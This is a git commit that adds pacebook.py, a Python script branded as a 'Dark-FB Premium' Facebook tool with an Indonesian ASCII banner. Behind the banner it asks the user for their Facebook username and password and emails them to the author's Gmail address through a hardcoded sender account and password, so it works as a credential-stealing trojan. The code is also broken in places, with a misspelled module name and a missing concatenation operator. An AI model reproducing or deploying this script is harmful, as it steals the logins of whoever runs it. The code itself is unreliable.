5df7394e94c15a51dcc195cbbab4a72ddd35070f
wedusganteng <63887769+wedusganteng@users.noreply.github.com>
2020-07-11 23:59:23 +0700

    Add files via upload

---
+++ pacebook.py
@@ -0,0 +1,50 @@
+import os, sys, socket, struct, time, yagmail, random
+
+hijau = '\x1b[1;92m'
+cyan = '\x1b[1;96m'
+kuning = '\x1b[1;93m'
+ungu = '\x1b[1;95m'
+putih = '\x1b[1;97m'
+biru = '\x1b[1;94m'
+merah = '\x1b[1;91m'
+gelap = '\x1b[0;37m'
+os.system('pip2 install yagmail')
+os.system('clear')
+time.sleep(3)
+x = ygmail.SMTP('tobeltobel40@gmail.com', '1230987@')
+subject = 'Akun'
+time.sleep(1)
+print ("""
+ █▄█████▄█         ●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
+ █ ▼▼▼▼▼  - _ --_-- ╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗
+ █    _-_-- -_ --__  ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗
+ █ ▲▲▲▲▲ --  - _ -- ═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝  Premium
+ █████████         «==========✧==========»
+  ██ ██
+ ╔════════════════════════════════════════════════╗
+ ║ *  ReCode   :   Mr.W3du5                     ║
+ ║ *  GitHub   :   https://github.com/Wedusganteng   ║
+ ║ *  FB       :   https://fb.me/Fajar      ║
+ ╚════════════════════════════════════════════════╝
+[*] Silahkan Login Operamini Agar Tidak Checkpoint
+
+════════════════════════════════════════════════════""")
+
+u = raw_input(' Username : ')
+p = raw_input(' Password : ')
+
+msg = 'Username : ' + u ' Password : ' + p
+body = msg 
+x.send('wedusganteng56@gmail.com', subject, body)
+def jalan(fjr):
+	for e in fjr:
+		sys.stdout.write(e)
+		sys.stdout.flush()
+		time.sleep(0.1)
+		
+
+
+
+
+
+
